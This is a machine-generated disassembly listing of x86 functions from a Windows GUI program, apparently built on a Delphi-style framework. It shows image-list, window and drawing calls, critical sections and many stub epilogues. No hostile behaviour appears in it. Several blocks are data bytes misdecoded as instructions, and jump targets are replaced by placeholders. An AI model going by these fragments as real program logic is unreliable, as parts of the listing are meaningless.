jmp sub_4039a0
sub_426447
jmp sub_4039a0
sub_42644e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42646b
lea eax [ ebp - 0x20 ]
call sub_403f9c
retn
sub_426464
jmp sub_4039a0
sub_426778
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_426780
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4267f4
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_426968
sub_42680c
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_426968
sub_426abc
jmp sub_4039a0
sub_426ac3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426c3b
jmp sub_4039a0
sub_426c42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426cd1
jmp sub_4039a0
sub_426cd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cfa
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
sub_426cf3
jmp sub_4039a0
sub_426cfa
pop ebx
mov esp ebp
pop ebp
retn
sub_426d0d
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_427084
jmp r-xdata
retn
sub_426d23
call sub_427110
retn
sub_426ea8
retn
sub_427100
jmp sub_4039a0
sub_42722b
jmp sub_4039a0
sub_427232
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42724b
jmp sub_4039a0
sub_427310
push ebx
mov ebx eax
mov eax ebx
call sub_426f80
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_42743e
jmp sub_4039a0
sub_427466
jmp sub_4039a0
sub_42746d
mov esp ebp
pop ebp
retn
sub_4274e4
jmp sub_4039a0
sub_4275ec
jmp sub_4039a0
sub_4276d7
jmp sub_4039a0
sub_4276e4
inc [ eax + 0x4 ]
retn
sub_42785f
jmp sub_4039a0
sub_427c10
jmp sub_4039a0
sub_427e5a
jmp sub_4039a0
sub_427e84
jmp sub_4039a0
sub_427e8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427ead
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_427ea6
jmp sub_4039a0
sub_427eb7
jmp sub_4036ec
sub_427f06
jmp sub_4039a0
sub_428133
jmp sub_4039a0
sub_42817b
jmp sub_4039a0
sub_4282e8
jmp sub_4039a0
sub_4283af
jmp sub_4036ec
sub_428404
mov [ eax + 0x31 ] 0x0
call sub_425418
retn
sub_428655
jmp sub_4039a0
sub_4286c0
jmp sub_4039a0
sub_4286c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428738
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_4287ec
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_4287fc
push ebx
mov ebx eax
mov eax ebx
call sub_4289b4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_428810
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42882c
push ebx
mov ebx eax
mov eax ebx
call sub_428a14
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_428888
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_428997
jmp sub_4039a0
sub_428bfb
jmp sub_4036ec
sub_428c5b
jmp sub_4039a0
sub_428c62
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_429043
jmp sub_4039a0
sub_42906f
jmp sub_4039a0
sub_4290d6
jmp sub_4036ec
sub_429107
jmp sub_4039a0
sub_42918c
jmp sub_4036ec
sub_429191
mov eax [ ebp - 0x38 ]
call sub_40324c
call sub_403a00
call sub_403a54
sub_4291a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4291c0
mov eax [ ebp - 0x18 ]
call sub_4027d4
retn
sub_4291b9
jmp sub_4039a0
sub_42930f
jmp sub_4036ec
sub_4295db
jmp sub_4036ec
sub_42966c
mov cl 0x1
call sub_429674
retn
sub_429984
xor ecx ecx
call sub_429674
retn
sub_429a06
jmp sub_4036ec
sub_429a0b
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a00
call sub_403a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429a5c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429b95
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429bc4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_429bd8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_429cf1
jmp sub_4036ec
sub_429da6
jmp sub_4036ec
sub_429e10
jmp sub_4036ec
sub_429e44
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_429dd0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429e5c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424110
retn
mov [ eax + 0x30 ] edx
retn
sub_429e74
retn
sub_429e78
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424110
retn
mov [ eax + 0x2c ] edx
retn
sub_429eb8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424110
pop ebp
retn 0x4
sub_429ecc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424110
pop ebp
retn 0x4
sub_42a08c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42a098
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42a145
jmp sub_4039a0
sub_42a14c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a237
jmp sub_4036ec
sub_42a2a3
jmp sub_4039a0
sub_42a3d1
jmp sub_4039a0
sub_42a3d8
pop ebp
retn
sub_42a4d8
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42a50c
retn
sub_42a50d
jmp sub_4039a0
j_sub_42a50c
jmp sub_42a50c
sub_42a514
pop ebp
retn
sub_42a518
sub [ rw-data ] 0x1
retn
sub_42a760
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_41a238
retn
sub_42a794
mov eax [ eax + 0x4 ]
call sub_41a0dc
retn
sub_42a7c5
jmp sub_4039a0
sub_42a7cc
pop ebp
retn
sub_42a7d0
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_14(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_14(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_14(comctl32:ImageList_SetIconSize) ]
sub_42a8b9
jmp sub_4039a0
sub_42a8c0
pop ebp
retn
sub_42a8c4
sub [ rw-data ] 0x1
retn
sub_42a98b
jmp sub_4039a0
sub_42a992
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42afa8
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42a9b4
mov [ rw-data ] sub_42aacc
mov [ rw-data ] sub_42aa3c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42acd0
mov [ rw-data ] sub_42ada4
mov [ rw-data ] sub_42ae78
retn
sub_42b039
jmp sub_4039a0
sub_42b040
pop ebp
retn
sub_42b044
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42afa8
sub_42b079
jmp sub_4039a0
sub_42b080
pop ebp
retn
sub_42b084
sub [ rw-data ] 0x1
retn
sub_42b313
add eax 0xffffffd4
jmp sub_42be40
sub_42b323
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a78
sub_42b32d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405aa0
sub_42b4c6
jmp sub_4039a0
sub_42b4cd
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b6dd
jmp sub_4039a0
sub_42b6e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b899
jmp sub_4039a0
sub_42b8fe
jmp sub_4039a0
sub_42b905
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b9f1
jmp sub_4039a0
sub_42b9f8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42bc08
lea eax [ ebp - 0x30 ]
call sub_403f9c
lea eax [ ebp - 0x20 ]
call sub_403f9c
retn
sub_42bc19
jmp sub_4039a0
j_sub_42bc08
jmp sub_42bc08
sub_42bc20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bd1b
jmp sub_4039a0
sub_42bd22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be1f
jmp sub_4039a0
sub_42be26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be86
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_42be8f
jmp sub_4039a0
j_sub_42be86
jmp sub_42be86
sub_42be96
pop ebx
pop ecx
pop ebp
retn
sub_42bf31
jmp sub_4039a0
sub_42bf38
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42bf44
mov eax [ eax + 0x20 ]
retn
sub_42c073
jmp sub_4039a0
sub_42c07a
pop ebp
retn
sub_42c07c
sub [ rw-data ] 0x1
retn
sub_42c0a9
jmp sub_4039a0
sub_42c0b0
pop ebp
retn
sub_42c0b4
sub [ rw-data ] 0x1
retn
sub_42c0ed
jmp sub_4039a0
sub_42c0f4
pop ebp
retn
sub_42c0f8
sub [ rw-data ] 0x1
retn
sub_42c405
jmp sub_4039a0
sub_42c40c
pop ebp
retn
sub_42c410
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c15c
sub_42c4f0
retn
sub_42c564
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42c570
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42c57c
mov edx [ eax ]
call [ edx ]
retn
sub_42c584
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42c5b1
jmp sub_4039a0
sub_42c5b8
pop ebp
retn
sub_42c5bc
sub [ rw-data ] 0x1
retn
sub_42c77b
jmp sub_4039a0
sub_42c782
pop ebp
retn
sub_42cb37
jmp sub_4039a0
sub_42cb3e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42cf58
jmp sub_4039a0
sub_42cf5f
pop ebp
retn
sub_42cf64
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c4f4
mov [ rw-data ] eax
sub_42cfa5
jmp sub_4039a0
sub_42cfac
pop ebp
retn
sub_42cfb0
sub [ rw-data ] 0x1
retn
sub_42cfdd
jmp sub_4039a0
sub_42cfe4
pop ebp
retn
sub_42cfe8
sub [ rw-data ] 0x1
retn
sub_42d015
jmp sub_4039a0
sub_42d01c
pop ebp
retn
sub_42d020
sub [ rw-data ] 0x1
retn
sub_42d04d
jmp sub_4039a0
sub_42d054
pop ebp
retn
sub_42d058
sub [ rw-data ] 0x1
retn
sub_42d085
jmp sub_4039a0
sub_42d08c
pop ebp
retn
sub_42d090
sub [ rw-data ] 0x1
retn
sub_42d0bd
jmp sub_4039a0
sub_42d0c4
pop ebp
retn
sub_42d0c8
sub [ rw-data ] 0x1
retn
sub_42d0f5
jmp sub_4039a0
sub_42d0fc
pop ebp
retn
sub_42d100
sub [ rw-data ] 0x1
retn
sub_42d12d
jmp sub_4039a0
sub_42d134
pop ebp
retn
sub_42d138
sub [ rw-data ] 0x1
retn
sub_42d165
jmp sub_4039a0
sub_42d16c
pop ebp
retn
sub_42d170
sub [ rw-data ] 0x1
retn
sub_42d3ea
jmp sub_4036ec
sub_42d3ef
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d40c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d414
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403448
pop esi
retn
sub_42d42c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403448
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42d444
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42d4ed
jmp sub_4039a0
sub_42d51b
jmp sub_4039a0
sub_42d522
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d52c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42d540
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42d79e
jmp sub_4039a0
sub_42d7a5
pop ebp
retn
sub_42efb8
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42efd4
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f46a
jmp sub_4036ec
sub_42f523
jmp sub_4039a0
sub_42f52a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f530
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42f4a4
sub_42f540
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42f4a4
sub_42f54e
mov eax eax
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42f4a4
pop ebp
retn 0x8
sub_42f568
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42f694
push ebx
mov ebx eax
mov eax ebx
call sub_446184
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f6a8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f6dc
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42f7e0
jmp sub_4039a0
sub_42f7e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f98a
jmp sub_4039a0
sub_42f991
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f99b
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f9b0
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44346c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f9cc
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44346c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f9e8
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44346c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fa04
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44346c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fa20
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44414c
sub_42fa34
mov al [ eax + 0x220 ]
retn
sub_42fb9d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42fbb5
jmp sub_4039a0
sub_42fec1
jmp sub_4036ec
sub_430034
retn
sub_4301c1
jmp sub_4039a0
sub_430244
push ebx
mov ebx eax
mov eax ebx
call sub_442480
mov eax ebx
call sub_430038
pop ebx
retn
sub_430258
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_442ba0
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_430380
pop ebx
retn
sub_430370
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_430449
jmp sub_4039a0
sub_430450
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430498
push ebx
mov ebx eax
mov eax ebx
call sub_446108
mov eax ebx
call sub_430038
pop ebx
retn
sub_4304ac
push ebx
mov ebx eax
mov eax ebx
call sub_4361cc
mov eax ebx
call sub_430038
pop ebx
retn
sub_4304c0
mov al 0x1
retn
sub_4304c4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43085d
jmp sub_4039a0
sub_430864
pop ebp
retn
sub_430868
sub [ rw-data ] 0x1
retn
sub_4308a1
jmp sub_4039a0
sub_4308a8
pop ebp
retn
sub_4308ac
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_430928
retn
sub_430929
jmp sub_4039a0
j_sub_430928
jmp sub_430928
sub_430930
pop ebp
retn
sub_430934
sub [ rw-data ] 0x1
retn
sub_43093c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_40324c
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_430a00
jmp sub_4039a0
sub_430a07
pop ebp
retn
sub_430a0c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_430958
call sub_403d70
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c58
sub_430a59
jmp sub_4039a0
sub_430a60
pop ebp
retn
sub_430a64
sub [ rw-data ] 0x1
retn
sub_430ac0
jmp sub_4039a0
sub_430ac7
pop ebp
retn
sub_430acc
sub [ rw-data ] 0x1
retn
sub_430b28
jmp sub_4039a0
sub_430b2f
pop ebp
retn
sub_430b34
sub [ rw-data ] 0x1
retn
sub_430b95
jmp sub_4039a0
sub_430b9c
pop ebp
retn
sub_430ba0
sub [ rw-data ] 0x1
retn
sub_430bec
jmp sub_4039a0
sub_430bf3
pop ebp
retn
sub_430bf8
sub [ rw-data ] 0x1
retn
sub_430c25
jmp sub_4039a0
sub_430c2c
pop ebp
retn
sub_430c30
sub [ rw-data ] 0x1
retn
sub_430cd8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c1d0
mov [ rw-data ] eax
sub_430d0d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_430d24
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_430da7
jmp sub_4039a0
sub_430dae
pop ebp
retn
sub_430db0
sub [ rw-data ] 0x1
retn
sub_430e1f
jmp [ edi ]
sub_4310c0
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4310d8
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43111c
push ebx
mov ebx eax
mov eax ebx
call sub_431844
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_431833
jmp sub_4039a0
sub_431844
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42cee8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_4310ec
sub_43189b
jmp sub_4039a0
sub_4318a2
pop ebp
retn
sub_4318a4
sub [ rw-data ] 0x1
retn
sub_4318ac
clc
sbb [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_435d47
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2321172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_435fbb
retn
sub_436102
jmp sub_4039a0
sub_436109
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43618e
jmp sub_4039a0
sub_436195
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43619c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44346c
pop ebx
retn
sub_4361b0
push ebx
mov ebx eax
mov eax ebx
call sub_4461c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44346c
pop ebx
retn
sub_4361cc
push ebx
mov ebx eax
mov eax ebx
call sub_445198
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436278
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4403c4
pop esi
pop ebx
retn
sub_4363e2
jmp sub_4039a0
sub_4363e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4364f8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_442480
mov eax ebx
mov si 0xffc7
call sub_403448
pop esi
pop ebx
retn
sub_4365e4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436600
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403448
sub_43661c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_436628
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41fca8
sub_43663c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43669c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436710
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403448
pop esi
pop ebx
retn
sub_43672c
push esi
mov esi eax
mov eax esi
call sub_441f8c
mov eax esi
mov si 0xffc7
call sub_403448
pop esi
retn
sub_4367d1
jmp sub_4039a0
sub_4367d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4367e0
push ebx
mov ebx eax
mov eax ebx
call sub_4420f0
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_436804
push ebx
mov ebx eax
mov eax ebx
call sub_442108
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4368f0
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_436efc
sub_436904
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_436efc
mov eax ebx
call sub_44414c
sub_436928
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44414c
sub_43693c
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44414c
sub_436980
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44414c
sub_436a81
jmp sub_4039a0
sub_436a88
pop ebx
pop ecx
pop ebp
retn
sub_436ba0
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_446be4
push eax
call SetWindowTextA
pop ebx
retn
sub_436bbc
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_436c62
jmp sub_4039a0
sub_436c69
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436d02
jmp sub_4039a0
sub_436e7b
jmp sub_4039a0
sub_436ee0
push ebx
mov ebx eax
mov eax ebx
call sub_436994
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_443f48
pop ebx
retn
sub_436fe0
push ebx
mov ebx eax
mov eax ebx
call sub_43ffd0
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4370d8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403448
sub_43723a
jmp sub_4039a0
sub_4372e4
mov eax [ r-xdata ]
retn
sub_4372ec
xor eax eax
retn
sub_437310
retn
sub_437428
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44414c
sub_4374a0
push ebx
mov ebx eax
mov eax ebx
call sub_457218
test eax eax
je r-xdata
mov eax ebx
call sub_441900
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4374c4
xor eax eax
retn
sub_43758b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3a31173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4375a4
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403448
sub_437695
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
